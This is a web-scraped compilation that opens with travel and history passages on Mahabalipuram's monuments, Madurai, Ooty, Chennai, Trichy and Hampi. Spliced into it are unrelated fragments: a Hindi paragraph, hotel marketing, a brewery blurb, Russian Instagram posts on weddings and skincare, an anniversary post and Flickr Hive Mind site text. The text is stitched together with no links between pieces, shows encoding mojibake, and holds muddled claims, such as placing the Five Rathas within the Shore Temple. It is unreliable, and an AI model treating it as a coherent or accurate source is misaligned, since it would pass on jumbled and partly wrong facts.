There are three temples in the Shore Temple which are situated near each other, dedicated to Lord Shiva and Lord Vishnu. The main temple is a five-storey structure dedicated to Lord Shiva and it is made of granite. The main attraction of the Shore Temple is the Five Rath or Punch Pandav Raths, four of which are named after the Pandavas and the fifth Draupadi is known as the Rath. Talking about the aesthetic excellence of artisans at that time, each of these chariots is vast and different from each other.According to mythological realm, this place was the capital of the demon king of Hiranyakashyap, which was inherited by his grandson and King Bali, the son of Bhakta Raj Prahalad. King sacrifices were considered more for their charity than their strength, tenacity, glory and glory. Once upon a time, Lord Vishnu sought only three steps from him in the form of a Brahmin to donate his land, but when the whole earth was measured in just two and a half steps by the Vaman incarnation of Brahmin, Mahadani Raja Bali To keep their feet, they made their head forward.This temple is one of the temples constructed by cutting the initial stones of Mahabalipuram. There is a glimpse of the rural life on the walls of the temple. In one of the pictures Lord Krishna is shown taking up the mountain of Govardhan on the finger. Here, these chariots are called Pandav chariots in the name of the five Pandavas of Mahabharata. Four of the five chariots have been carved on a single rock. Draupadi and Arjun are in the shape of the chariot class. There is a Bhim chariot. Dharmaraj Rath is the highest.

A busy seaport for Indian traders right from 1st century CE, Mahabalipuramâ€™s history and importance go back a long way. It was the second capital for the Pallava Dynasty, who ruled South India from the 3rd Century to the 9th Century â€“ a period referred to as the Golden Age for the Pallavas. The artistic work carried out during this period in the form of fascinating monuments is what makes Mahabalipuram an important tourist destination today among lovers of art, culture, history, and architecture.
 The monuments here are dedicated to various Hindu deities, although many of these are as part of devotion to Lord Shiva. It is believed that there were several more structures, which were swallowed or damaged by the sea. The modern-day town as we know it was established in 1827 during the British rule in India.Known for its monolithicÂ structures, Mahabalipuram has monuments that date back to the 7th and 8th Centuries, when the region was under the reign of the Pallava Kings. Featuring the Dravidian architectural style, the stunning monuments have been listed among the UNESCO World Heritage Sites. These draw thousands of visitors annually, and it is not tough to see why. Hereâ€™s a look at the different kind of monuments (primarily divided into four categories) you can expect to marvel at in Mahabalipuram.Well-known for featuring beautiful bas-relief work, the rock reliefs here are carved on individual rocks or boulders. These open-air reliefs are a highlight among the many structures, and the one known as â€˜Descent of the Gangesâ€™ (also called Arjunaâ€™s Penance and Bhagirathaâ€™s Penance) is particularly famous. It is also considered as the worldâ€™s biggest bas-relief structures, formed from two gigantic adjacent granite boulders. A cleft represents the Ganges River and also depicts Arjuna â€“ the primary character from Hindu epic Mahabharata â€“ praying to Lord Shiva while on one leg.
 The exquisite carvings and sculptural work done on giant stones are truly marvellous and a true testament of the skilled artisans of the bygone era. The carvings depict various Hindu mythological episodes.

As per the Legend, Lord  Vishnu appeared before Pundarika in his actual form at this holy place. Pundarika means Lotus who offered Lotus to Vishnu. Pundarika thought of offering garland Lord Vishnu at Ocean of Milk. The sage was not sure on what to do, he was restless, he thought of drying the sea to reach the place.  Lotus flowers which he was carrying remains fresh even after a year. The waters too never got exhausted. Lord Vishnu in the form of an old man appeared before Pundarika. Lord tried to prevent Pundarika from his effort but the Sage remained strong. Lord Vishnu asked him to bring food as he is hungry. The Sage returned to the shore but took the food accordingly from Mamallapuram and reached the shore, but the old man was not around. The sage noticed the idol of Lord Vishnu down on the sands. The sage realized that it is none other Lord Vishnu who appeared as an old man. Lord Vishnu appeared before him in his actual form. Thus Lord Vishnu is seen there since then lying on the barred flor, hence “Thalaysayana”. Sage Pundarika Tirtha is said to be more holy than the Ganges. It is believed that sage Agasthya and Garuda took a holy dip in this Tirtha and attained Moksha.

The minute I glanced the shore temple of Mahabalipuram I was lost in transition. The temple is set amidst a perfect milieu:  rocks, waves and seashore. I always love to visit the Temples of Tamil Nadu especially for their architectural grandeur. But the shore temple was a completely different experience for me. The temple is an iconic heritage monument for people visiting Tamil Nadu. No doubt Mahabalipuram attracts thousands of art aficionados from all over the world. It’s a must see architectural wonder.The ancient inscriptions say that, the outstanding monuments found in Mahabalipuram are the sculptural legacy left behind by the Pallava Kings Mahendravarman I, his son Narasimhavarman and their descendants. Legend says that, Mahendravarman was a famous patron of fine arts and devoted his wealth and time to nurture these arts. In fact, he was greatly influenced by the sculptures and carvings of the Ajantaand Ellora caves. Mahabalipuram is also known as Mamallapuram, a name derived from the former Pallava ruler Narasimhavarman I. He earned the name Mamallan since he was an acclaimed wrestler.The third is the Arjuna Ratha. This Ratha is immensely beautiful with sculptures of Lord Vishnu sitting on Garuda (his Vahana), Lord Shiva leaning on Nandi and Lord Indra with his elephant, Airavatha. You can also see a very realistic huge figure of the Nandi here. Next to the Arjuna Ratha, stands the magnificent Draupadi Ratha. This Ratha is dedicated to Goddess Durga and you will find different forms of the Goddess carved on the inner and outer walls of the Draupadi Ratha. The smallest of the Five Rathas is the Nakul-Sahadeva Ratha. Apart from a monolithic elephant which is majestically carved, this Ratha has less carvings and sculptures.This is one of the main glorifying parts of Mahabalipuram. Arjuna’s penance is carved from a single rock 96 feet long and 43 feet high (can you believe it?) you need to take a closer look to see the marvelous carvings! Chandra, Surya, Siddhas, Kinnaras, Apsaras, Gandharvas, Ganas in attendance, Lord Shiva carrying his Trident, Sages in meditation are seen here depicting the theme of Arjuna’s Penance. Other wonderful sculptures like an elephant family, lions, boar, rats, deer can be seen at Arjuna’s Penance. Legend says that, Arjuna undertook a powerful Penance to secure a strong weapon from Lord Shiva to destroy his enemies. When Shiva granted the boon, visitors from heaven and earth reached to witness the Arjuna war! Hence, the Arjuna penance was created at Mahabalipuram.If you plan to hit the beach, make sure you reach either before sunrise or after sunset. It becomes extremely hot after the sunrise and you may not enjoy the beach! I reached the seashore at 5.30 am since the Mahabalipuram temple is opened for tourists only at 6 am. I enjoyed clicking some beautiful before-the-sunrise pictures. There is aThiruvalluvar (celebrated Tamil poet and philosopher) Statue on the beach of Mahabalipuram. I clicked this shot when it was completely dark! It’s the moon that’s shining above and not the sun 🙂 !!!

The town was developed by The Pallava Dynasty who realized Mahabalipuram’s importance as a trade base. Controlling a major port city gave them a strategic uphold making them an economic superpower. Today Mahabalipuram is famous for ancient architectural marvels that Pallavas created during their reign. Every year a number of tourists come to visit these open rock reliefs like shore temple, Krishna’s butterball, and Pandava’s Chariot. These intricate pieces of architecture have provided Mahabalipuram the status of UNESCO’s World Heritage Sites. You can rent a bicycle for an entire day for INR 50 or 60 and explore the local areas. Some of the popular cycle trails of Mahabalipuram are, the temple area which is at a distance of 500 meters from the colony, this is followed by Kudumbadi cycle tour. Kudumbadi is a small village that goes through country roads. The locals here are very hospitable, despite the fact that their language is totally unfamiliar. Kudumbadi is also a home of local potters who are known for their skillful hands and intricate carvings. Spend your day here, take a pottery lesson with the locals and feast upon the local food followed by generous coconut water.

                                Once the abode of the famous demon king Mahabali, Mahabalipuram was later renamed Mamallapuram. The serenity, the alluring atmosphere and the impressive setting with many beautiful white sandy beaches dotted with casuarina trees are all reasons as to why one would want to visit this wonderful town. Some famous tourist spots include the UNESCO world heritage site Group of Monuments like the Shore Temple and the Five Rathas, the Crocodile Bank which is home to some exquisite species of crocodiles and alligators, and the beach resorts in Kovalam and Sadras.Mahabalipuram is famous for its architectural wonders. These monuments, revering the various Gods and holy scriptures of the Hindu religion, are mainly in the form of temples, rock-cut caves and other stone inscriptions. These monuments are classified into five major forms - the Rathas or chariot temples, Mandapas or cave temples, rock relief structures, structural temples and excavations. The Rathas are found in the southern part of the town, the most famous being the Panch Rathas, dedicated to the 5 Pandava brothers from the Mahabharata. The Mandapas were historically places for social gatherings to take place. They have excavated caves depicting various intricate carvings from Hindu mythology.  Among the temples, the Shore temple located along the sea is the most popular, mainly dedicated to the Lords Shiva and Vishnu. Rock reliefs, as the name suggests, are carved on independent rocks or big stones. The rock relief structure, Descent of the Ganges or Arjuna’s penance, is believed to be one of the largest in the world and is carved on two large boulders 27m long and 9m high.
Mahabalipuram or Mamallapuram was once a trade city that was established during the Pallava dynasty. It became an important port and was a flourishing and vibrant centre of activity. The Pallavas left behind a treasure-trove of history, architecture and culture in the form of stunning monoliths and rock temples, and sculptures dedicated to the Gods. The history of this town stretches even beyond the 7th & 8th centuries and the Pallava dynasty; settlements belonging to the pre-Sangam era and artefacts that predate the birth of Christ have also been found here. There is thus an air of mystery surrounding Mahabalipuram’s history, with historians being unclear about the exact origins and roots of this popular tourist destination.
									Mahabalipuram can be covered within a day. Reach Mahabalipuram by morning. Visit the Tiger Cave that is located at the entrance of Mahabalipuram. Check out the rock monument called "The Descent of the Ganges", also known as Arjuna's Penance. Visit the Varaha and Krishna Cave temples. After lunch, check out the various handicraft stores that sell beautiful stone artefacts. Then, Visit the Krishna's Butterball and the Pancha Rathas.The India Seashell Museum is also worth a visit. End the trip with a visit to the Shore Temple.

Madurai

Madurai is one of the oldest cities of India, with a history dating all the way back to the Sangam period of the pre Christian era. The glory of Madurai returned in a diminished form in the earlier part of this millennium; it later on came under the rule of the Vijayanagar kingdom after its ransack by the ravaging armies of Delhi (Malik Kafur). During the 16th and 18th centuries, Madurai was ruled by the Nayak Emperors, the foremost of whom was Tirumalai Nayakar. The Sangam period poetNakkeerar is associated with some of the Tiruvilayaadal episodes of Sundareswarar – that are enacted as a part of temple festival traditions even today.

The Sangam age or the Golden age of Tamil literature – produced masterpieces way back in the Pre christian era and in early 1st millennium . Madurai was the seat of the Tamil Sangam or Academy of learning. The entire city of Madurai, is built around the Meenakshi Sundareswarar Temple – the temple par excellence. Concentric rectangular streets surround the temple, symbolizing the structure of the cosmos.
As early as the 3rd century BC, Megasthanes visited Madurai. Later many people from Rome and Greece visited Madurai and established trade with the Pandya kings. Madurai flourished till 10th century AD when it was captured by Cholas the arch rivals of the Pandyas.

The Cholas ruled Madurai from 920 AD till the beginning of the 13th century. In 1223 AD Pandyas regained their kingdom and once again become prosperous. Pandian Kings patronised Tamil language in a great way. During their period, many master-pieces were created. “Silapathikaram”, the great epic in Tamil was written based on the story of Kannagi who burnt Madurai as a result of the injustice caused to her husband Kovalan. In April 1311, Malik Kafur, the general of Alauddin Khilji who was then the ruler of Delhi, reached Madurai and raided and robbed the city for precious stones, jewels, and other rare treasures. This led to the subsequent raids by other Muslim Sultans. In 1323, the Pandya kingdom including Madurai became a province of the Delhi empire, under the Tughlaks.

The 1371, the Vijayanagar dynasty of Hampi captured Madurai and it became part of the Vijayanagar empire. Kings of this dynasty were in habit of leaving the captured land to governors called Nayaks. This was done for the efficient management of their empire. The Nayaks paid fixed amount annually to the Vijayanagar empire. After the death of Krishna Deva Raya (King of Vijayanagar empire) in 1530 AD, the Nayaks became independent and ruled the territories under their control. Among Nayaks, Thirumalai Nayak (1623-1659) was very popular, even now he is popular among people, since, it was he who contributed to the creation of many magnificent structures in and around Madurai. The Raja Gopuram of the Meenakshi Amman Temple, The Pudu Mandapam and The Thirumalai Nayakar’s Palace are living monuments to his artistic fervor.

Madurai started slipping into the hands of the British’s East India Company. In 1781, British appointed their representatives to look after Madurai. George Procter was the first collectorof Madurai.
Now after India’s independence, Madurai is one of the major districts of Tamilnadu State. Later on Madurai district was bifurcated into two districts namely Madurai and Dindugul Districts. In Madurai District, there are 15 State Assembly constituencies and two parliament constituencies.
The history of Madurai will not be complete without mentioning the name of RaniMangammal, the woman of great skill and sagacity. History does not provide many instances of ruling queens in Tamil Nadu. Though it was considered that women were not suited to succeed the throne of a kingdom, Rani Mangammmal, however shines in almost solitary eminence as an able and powerful ruler in Tamil Nadu.

Madurai is famous for its temples.The Aappudaiyaar Koyil Tevara Stalam and the Koodalazhagar Divya Desam are the most important temples one should rarely miss to go. In the vicinity of Madurai is Tirupparamkunram, one of the 6 padai veedu shrines of Murugan (glorified in Madurai Sangam Nakeerar’s Tirumurugaatruppadai). Also in the vicinity of Madurai is Alagar Koyil, one of the prominent Divya Desam shrines of the Sri Vaishnavite faith.


Ooty
Ooty, is also known as “Udhagamandalam“. It’s been rightly titled as the as Queen of Hills. Ooty, the headquarters of The Nilgiris district is one of the famous hill stations in India. It is situated at an altitude of 2,240 meters above mean sea level.

The word Nilgiris means Blue Mountains. It is a land of picturesque picnic spots and had been a popular summer and weekend getaway for the British during the colonial days. There are plenty of interesting tourist spots like Botanical Gardens, Lakes, Boat houses, water falls, shooting spots, Wildlife Sanctuary, Tea estates and many more.


Chennai 
Chennai, the capital city of Tamil Nadu, is located at the North east of the state. Apart from being a major district, this metropolis also serves as the gateway of South India. General information about Chennai reveals that of late, the city of Chennai has developed as one of the cosmopolitan cities in India that plays an important part in the cultural, intellectual and historical growth of India.

Representing the Dravidian Civilization, the interesting city of Chennai upholds the music, drama, dance, architecture, arts and crafts and sculpture etc of India. Chennai was mainly the result of the historical accident and the strategic necessity. Symbolizing the rise of the British during the 17th century, in the South of India through the creation and consolidation of the famous East India Company, Chennai was established by the British. The city then acted as the naval base and trading centre for the British. By the end of the 20th century the city had already developed as a major administrative centre.

Chennai besides acting as the cultural and educational hub of South India has also been the cradle of several historic movements. Today it is a leading city in terms of trade and commerce. The Chennai economy has a huge industrial base in technology, cars, manufacturing, hardware and health industry. The revenue and the employment sectors of the city are very advanced.
Chennai is a culturally developed city replete with centres of Carnatic Music and cultural events. Apart from the vibrant theatre life scene Chennai also has a popular film industry with numerous studios involved in the making of Tamil, Kannada, Malayalam, Telugu, and Hindi movies which popular all across India.


Trichy
Tiruchirappalli, situated on the banks of the river Cauvery is the fourth largest city in Tamil Nadu. It was a citadel of the early Cholas which later fell to the Pallavas. Trichy is a fine blend of tradition and modernity built around the Rock Fort. Apart from the Fort, there are several Churches, Colleges and Missions dating back to the 1760s. The town and its fort, now in Trichy were built by the Nayaks of Madurai. This city has given great Tamil scholars whose contributions to the Tamil literature have been very significant.


The most famous land mark of this bustling town is the Rockfort Temple, a spectacular monument perched on a massive rocky out crop which rises abruptly from the plain to tower over the old city. It was one of the main centers around which the wars of the Carnatic were fought in the 18th century during the British-French struggle for supremacy in India.

According to legend, after killing Ravana Lord Rama returned with his consort Goddess Seetha to India first stepping on theshores of Rameswaram. To expiate the “dosha” of killing a brahmin, Lord Rama wanted to offer worship to Lord Shiva. Since there was no shrine in the island had despatched Sri Hauman to Kailash to bring an idol of Lord Shiva.

इस स्मारक समूह का इतिहास काफी धुंधला है क्यूंकि इसके निर्माण का कोई स्पष्ट प्रमाण नही मिला है। उस स्थान पर पाए गये कुछ शिलालेखो और सिक्को से यह अनुमान लगाया जाता है की इसका निर्माण लगभग 7वीं शताब्दी ई. में दक्षिण मद्रास के पल्लव राजवंश द्वारा किया गया था। पल्लव राजवंश ने महाबलीपुरम पतन की भी स्थापना की थी, जिस पर दक्षिण-पूर्व एशिया के दूरस्‍थ के साम्राज्यों कम्बुजा (कंबोडिया) और श्रीविजय (मलेशिया, सुमात्रा, जावा) के व्यापारी आकर व्‍यापार करते थे। यह पतन लगभग 630 ई. से 728 ई. के बीच बहुत प्रसिद्ध हो गया था क्यूंकि यही वह काल था जिसमे महाबलीपुरम स्‍मारक समूह को निर्मित और सुसज्जित किया गया था।

Hospitality design has seen significant changes over the last decade. As new hotels are erected and old properties are refurbished, trends in design evolve in conjunction with advancements in engineering, technology, art and style. While architectural design has long been known to capture the essence of different cultures and civilizations over time, hotel design must now appeal to a wide variety of guests and travelers. From religious sites, to national monuments, museums and modern skyscrapers, thoughtfully-designed structures are an artistic reflection of the way people utilize space, and this remains one of the main highlights of global travel today. Rising travel trends such as wellness tourism, adventure travel and curated experiences have inspired hotel chains to evolve their design philosophy to suit the lifestyles and beliefs of their travelers. To keep up some of the latest advancements in tourism travel, brands are seeing new means of designing spaces. InterContinental Hotels Group (IHG®) is one such brand that offers travellers the opportunity to seek new experiences through unique architecture, be inspired on their travels or just explore some of the region’s best designed properties.

After Diversition, a 25 kms drive on single road in between mountains. We can enjoy the drive on the way to hills. Nandi hills is about 1500 Mts above sea level. There are around 40 sharp Curves. we need to be little cautious. There are many eucalyptus trees. Tipu Sultan had a very good taste & can say he is a nature lover. The place is full of greenary, big trees. Its really a good Place to visit..While going in car, dont close your  window glasses. We can enjoy fresh air. For 2 wheelers, its compulsary to wear a helmet & No triple riding. Its better to take our own food & water. Try to drink some cocunuts, there are very fresh

Meeting on opposite sides of the bar, Richard Adamson and Oscar McMahon got talking. It turned out they both shared a love of beer and a view that the Sydney beer scene was behind the times. It should, they thought, be more adventurous, innovative and fun. Since Richard knew how to brew and Oscar knew all the ins and outs of hospitality, they figured they could do more than just talk. Fast forward a few years and a lot sure has happened, increased brewery size, a range of high quality Australian hand crafted spirits, a FOO FIGHTERS beer, and more. Visit the YH team this September for a yarn and an ice cold brew. 🤙 #beerincider Белые кораблики🚤.
Я, как коренная петербурженка, не раз каталась на теплоходах по Неве и каждый раз я испытываю нереальный восторг😍. Ты словно ощущаешь себя туристом в родном городе, и смотришь на город с другого ракурса, так что всем туристам #mustdo ✅.
А теперь ловите интересные факты о Петербурге, один из которых НЕ ВЕРНЫЙ, угадайте какой:
1) У нас самый глубокий метрополитен в мире
2) У нас рекордное количество мостов
3) У скульптуры Петра Первого зрачки с сердечком
4) Петр 1 запретил каменное строительство по всей России, кроме Петербурга
5) Петр 1 издал указ, по которому каждый приезжающий в Петербург, должен был привезти с собой камень и действовал это закон 62 года.
6) Фонтаны в Петергофе работают без насосов
7) Александровская колонна ничем не закреплена и держится на постаменте за счёт тяжести собственного веса.3 years ago, @benjmorg saw me coming out of a port-a-potty at WayHome Music Festival in a Roots hoodie and cutoff jean shorts and said to himself, “That’s the love of my life right there!” ⠀
(At least that’s what he tells me...😂)⠀
We'd creeped each other on Facebook and played it cool, but on the last day of the festival, we bonded over our shared love of tacos (really I was just looking to talk to him alone, and who can so no to tacos?). ⠀
While watching Vance Joy he said, "Do you want to get a drink?" By this point, the sun had cooked my brain so I responded, "Ya, that'd be great! Maybe Wednesday or Thursday?"⠀
An awkward pause followed and I realized, "Oh... you meant like right now..." to which he said, "Did I just trick you into a date?"⠀
And that's how our first date happened! ⠀
We grabbed some wine and charcuterie and sat in a park in Toronto and talked until we ran out of wine. So we went to a bar and talked until we were told we had to leave. He brought this list of questions that he said had been part of a study - that when people answered them together, they were likely to remain friends for life. A year later, I found out it was actually a list of questions that were shown to lead to lasting and meaningful love. ⠀
Well, here's further proof for that study! ⠀
I saw in that night what I still see today, someone I never want to stop talking to. ⠀
Happy anniversary to the greatest travel buddy, wine connoisseur, chef, dad to Islay & Nino, and overall partner I could ever imagine. Love you 😘
📸 @megisabel (Shout out to @lefavourite and @geoffisname for playing matchmakers!)This was an incredible experience, was only my second time in a plane 😍 Was interesting as it was a small plane and I get motion sickness but still tried to push through to get some decent shots 🤢😂

Была уверена,что у меня будет фотосешн, ЗАГС в джинсах и #honeymoon , конeчно жe. Hо! Нас теперь двое, поэтому под давлением мужского пола пришлось сдаться. К тому же, надо иногда быть #слабаяженщина и #милыйрешайсам
Зато теперь могу сделать определенные выводы:
1. Не нужно контролировать абсолютно все! Мне постоянно хочется быть в курсе всего, что делается, а потом я стаю нервная и невнимательная. Разделите обязанности между собой. И не лезьте в #mustdo своего партнера, а то потом начинается "ты мне не доверяешь" и т.п. Делегируйте и получайте удовольствие.
2. Не зацикливайтесь на неудачах. Организовывали мы свадьбу вдвоем. Впервые😁 Именно поэтому было много ошибок и лишней работы. А в последнюю неделю началась вообще беда: дизайнер полиграфии (которого так долго выбирали) слетел, стилист приболел и т.п. Хотелось просто сказать: гости, извините, давайте в следующий раз. Но мы то люди серьезные, сели, сделали todolist на каждый день и решили не обращать внимания на маленькие неприятности.
3. Будьте собой! Ненавижу каблуки, но на собственной свадьбе хочется казаться на несчастных 5см выше, поэтому пришлось выбирать туфли. Оказались они весьма удобными, правда, только первые 10 мин. Уже через час переобулась в балетки. Ну, а что, под платьем все равно не видно😁
4. Не ленитесь ставить первый танец! У меня сплошные проблемы: и с музыкальным слухом,и с координацией, и тем более с пластичностью. Хотела просто станцевать медляк, но снова сдалась...И оно того стоило! Кажется, получилось трогательно и красиво. Ну, на видео так точно. Но главное — наши эмоции и взгляды друг на друга в этот момент!
5. Лавстори в отдельный день! И точка! Во-первых, хочется какого-нибудь не слишком банального места, а это может занять целый день вместо 3х часов в парке КПИ вместе с дорогой. Во-вторых, это реально выматывает. Кроме того, это отличный шанс привыкнуть к платью, успеть его сдать в химчистку при необходимости, потренироваться с макияжем и прической, а еще, если фотограф будет таким же хорошим,как наш, то успеть получить несколько снимков в день свадьбы.

I must commend the Matahari Cycle Tours Team for such a thoughtful and well planned tour. I booked into the Balik Pulao Countryside Tour at the final hour and was lucky to have Princilia lead the tour the following day.
Such a great way to experience Penang and such a ray of sunshine during our my stay in Malaysia.
Thank you to the Matahari Cycle Tours team, I will sing your praises back in Australia!

Но забываем о том, что нам следует делать. Поэтому, я предлагаю начать рубрику #mustdo .
🌼 Каждая женщина стремится сохранить свое очарование, и каждая делает это по-своему. Но почему-то далеко не все в состоянии потратить несколько минут на 4 этапа ежедневного ухода за лицом.
💮1 этап - Очищение
Очищать лицо нужно и утром, и вечером.
Лицо следует очищать при помощи гелей, муссов, косметического молочка. 💮2 этап - Тонизирование
После очистки лица нужно обязательно протереть его тоником. Тонизирование - важный момент повседневного ухода лицом, за кожей любого типа, его следует производить после каждого очищения - дважды в день: утром и вечером. 💮3 этап - Увлажнение и защита
Дневной крем применяют утром или днем, как под макияж, так и без него, примерно за полчаса до выхода на улицу. Его следует наносить не только на лицо, но и на шею.
Пленка, возникающая на коже после применения дневного крема, выполняет защитную функцию, под ним кожа меньше страдает от метеорологических факторов внешней среды, пыли и грязи. Кроме того, дневной крем препятствует испарению воды с поверхности кожи, способствует поддержанию достаточного уровня её увлажненности.
💮4 этап - Питание
Вечером, после очищения и тонизации, применяется «ночной» крем. Ночные кремы относятся к категории «питательных». Они подбираются в соответствии с типом и состоянием кожи."Here's to the Crazy ones, the misfits, the rebels, the troublemakers.
The round pegs in the square holes. They're not fond of rules, and they don't have respect for the Status quo.
You can quote them. Disagree with them. Glorify or vilify them. About the only thing you can't do is ignore them, because they change things.
They push the Human Race forward.
And some may see them as the crazy ones, we see genius.
Because the people who are crazy enough to think they can change the World 🌎 are the ones who do."

#WhenInNewYorkCity 🗽When we were in Delhi some weeks ago, my nephew found that the Rashtrapati Bhawan is now open to public for tours. They have been since 2012 (apparently) and now you can simply book tickets online! It’s ridiculously cheap at 50 bucks a person and they organize a wonderful hour long tour in Hindi or English where they show you the the Forecourt and premier rooms of the Bhavan including, the Banquet Hall, Ashok Hall, Durbar Hall (where Prime Ministers get sworn in), Library, North Drawing Room, Long Drawing Room, Navachara and the tapestry/ carpet and gift museums. We had a lovely guide, Ms. Rosy Gupta, who was pursuing her doctorate and was the premier guide, taking the Italian PM around to understand the art of the Bhawan and other dignitaries. And we just booked a regular tour online! Everyone was very polite although due to security reasons, you cannot carry a camera or mobile. They also have other tours that cover different grounds, and a Garden tour only available one month in the winters. You can additionally sign up to see the change of guards! Just a great experience. @rashtrapatibhavan

Интересно, все-таки, каким образом они собираются материал и формируют эфир 🤔
Вот, яркий пример отрывка сегодняшней программы.
Сколько тратим мы, девушки, на красоту и уход за собой. И тут же озвучивается список ежемесячных #mustdo процедур с ценами (каким образом он формировался, остается загадкой). Туда, значит, вошли:
✅ маникюр с покрытием гель лаком - 100грн 🙄
✅ оформление бровей с покраской - 50грн 🙊
✅ наращивание ресниц - 150грн 😟
✅ стрижка и окрашивание волос - 350грн 😁
✅ депиляция комбо (бикини, руки, ноги, подмышки) - 200грн 😷
.
И это транслирует Киев, неплохо живут там они, однако 😎😂
Возникает вопрос. Причем один сплошной вопрос 😂 Эфир ведет Лилия Ребрик, с каждым пунктом сама удивляясь собственным словам так, вроде бы она вообще со всеми этим не знакома и подобного не делает и вообще она мужчина 🙈😂 .
Ни слова о косметологии, зато наращивание ресниц - это уже , оказывается, то, без чего никак и никуда 🤗
В конце подытожили всё устрашающей цифрой в 14 000 грн, именно в эту сумму примерно выходит затратность на уход за собой у девушек в год. .
Странно, а почему не привели тогда цифру за 10лет, да с коэффициентом инфляции, цифра была бы более устрашающая😈
.
Одного не понимаю, смысл подобной "работы" с полной дезинформацией, взятой с потолка 💔Spend some quality time with family this summer on the world’s very first tokidoki themed boat in Singapore!
Cruise will be available from 2 August 2018 onwards. An Early Bird rate $50 (original $58) is offered to advance purchases by 31 July, tickets are available up to 3 months in advance.

Here's a clue. I took this picture at the Army Heritage Museum. This Museum at Annandale in Shimla is painstakingly and lovingly curated and stunningly located. It is nestled in a valley amidst towering Himalayan deodars. The display and sections therein enlighten the public on the history, ethos, role and achievements of the Indian Army.

Flickr Hive Mind is a data mining tool for the Flickr database of photography.   Flickr Hive Mind is a search engine as well as an experiment in the power of Folksonomies. All thumbnail images come directly 
		from Flickr, none are stored on Flickr Hive Mind. These photos 
		are bound by the copyright and license of their owners, the thumbnail links take to you to the photos 
		(as well as their copyright and license details) within Flickr. Because some other search engines (Google, etc.) index parts of 
		    Flickr Hive Mind, you may have been led here from one of them.  Welcome to Flickr Hive Mind, almost certainly the best search engine for photography on the web.  If you are a Flickr 
		    user and use Flickr Stats you 
		    may have seen people being led to your photos via Flickr Hive Mind (as a Referrer).
		    Flickr requires that I inform you that Flickr Hive Mind uses the Flickr API, but is neither endorsed nor certified by them.
		    There are literally hundreds of other web tools built around the Flickr API, see 
		    Flickr Bits for a bunch of examples.
		
		
		    If you are unhappy with your photos' presence on this site, you can (a) 
		    make your photos private for yourself, friends, and family.  These settings will be instantly honored by 
		    Flickr Hive Mind and all other API-driven applications.  (b) Hide your photos globally from text and tag searches on 3rd party sites that use the Flickr API, via your preference settings on Flickr. See the privacy tab at: 
		    https://flickr.com/account/. To also remove yourself from searches for specific user names, you will need to set your Flickr profile to be hidden from searches.   Flickr has finally  created a single page with all these settings, this is much easier to do now and is the preferred method - it will shut down all API driven sites.    Google has a bad habit of keeping out-of-date links and thumbnails in their search results, I can try to help you remove them.
		
		    (c) Finally, you can
		
		    Banish Yourself 
		    From Flickr Hive Mind.  To banish yourself from Flickr Hive Mind, you must first authenticate to Flickr, which lets Flickr Hive Mind identify who you are.  This is necessary to make sure you are the user in question, and also because people use such crazy characters in their Flickr user names. You can revoke access when finished. Once logged in, come back to this area 
		                              and there will be a link to banish you. If there are any problems email me at nosflickrhivemind ... at ...  fiveprime ... dot ...  org. (a few people with weird characters in their user names may have had problems)Log In To Flickr Now

		Flickr Hive Mind is a data mining tool for the Flickr photography database, allowing search by:  tags(keywords); Flickr photography groups; Flickr users, their contacts, and favorites; free text; the Flickr Explore algorithm for interestingness.  Flickr Hive Mind can also be an effective tool to identify photography with licenses that allow non-commercial (and sometimes) commercial use.

Another throwback to my trip to  #mahaballipuram in 2016 where I got to see the  #groupofmonuments consisting of 6-8th century religious monuments.  #unescoworldheritagesite

#tamilnadu #incredibleindia #nexus5I've simply fallen in love with  #mamallapuram . With its  #groupofmonuments declared as UNESCO heritage site,  #mahabs has something for everyone ! Stories of the  #pallavadynasty , temple architecture and monuments for the historian, excavated ruins and open air reliefs for the archaeologists, gigantic boulders and rocks for the geologists, the precariously balanced  #krishnabutterball defying physics for the physicist,  #bouldering for the adventurous, temples and gods for the religious, sculptures for the artist...  #mustsee #templesandarchitecture #stonecarving #mahabalipuramIf I could, I would have bought every single piece of these exquisitely carved stone sculptures in Mahabs, erstwhile  #mahabalipuram now called  #mamallapuram . I wasn't prepared as I suddenly spotted them during my adventurous autorickshaw ride to explore the famous  #groupofmonuments in the temple town. My polite Tamilian driver was quick to spot me silently marveling at the masterpieces and stopped at every unit spread across town where I could see the sculptors chiseling, grinding and polishing these amazing stones. These hand-crafted stone sculptures of Mamallapuram have been granted the Geographical Indications (GI) tag in recognition of this art, so unique to the region.

According to this inscription, this temple was operating during the time of Shivagupta Balarjuna, and the temple is dated to 7th or 8th century. Below the temple terrace, are ruins of two buildings, one likely a residence for priests and monks, another a small tantric temple with 16-edge Shiva linga possibly from later centuries.

The temple is made out of white stone. It used to be a soil mound with tunnels (surang) used by the locals, but the temple was excavated between 2006 and 2007.

The pillared terrace on the top was likely a mandapa, as it has ruins of many carved pillars in navaranga pattern.

It became the centre of the Hindu Vijayanagara Empire capital in the 14th century. Chronicles left by Persian and European travellers, particularly the Portuguese, state Hampi was a prosperous, wealthy and grand city near the Tungabhadra River, with numerous temples, farms and trading markets. By 1500 CE, Hampi-Vijayanagara was the world's second-largest medieval-era city after Beijing, and probably India's richest at that time, attracting traders from Persia and Portugal. The Vijayanagara Empire was defeated by a coalition of Muslim sultanates; its capital was conquered, pillaged and destroyed by sultanate armies in 1565, after which Hampi remained in ruins.

The austere, grandiose site of Hampi was the last capital of the last great Hindu Kingdom of Vijayanagar. Its fabulously rich princes built Dravidian temples and palaces which won the admiration of travellers between the 14th and 16th centuries. Conquered by the Deccan Muslim confederacy in 1565, the city was pillaged over a period of six months before being abandoned. Hampi’s spectacular setting is dominated by river Tungabhadra, craggy hill ranges and open plains, with widespread physical remains. The sophistication of the varied urban, royal and sacred systems is evident from the more than 1600 surviving remains that include forts, riverside features, royal and sacred complexes, temples, shrines, pillared halls, Mandapas, memorial structures, gateways, defence check posts, stables, water structures, etc. Among these, the Krishna temple complex, Narasimha, Ganesa, Hemakuta group of temples, Achyutaraya temple complex, Vitthala temple complex, Pattabhirama temple complex, Lotus Mahal complex, can be highlighted. Suburban townships (puras) surrounded the large Dravidian temple complexes containing subsidiary shrines, bazaars, residential areas and tanks applying the unique hydraulic technologies and skilfully and harmoniously integrating the town and defence architecture with surrounding landscape.

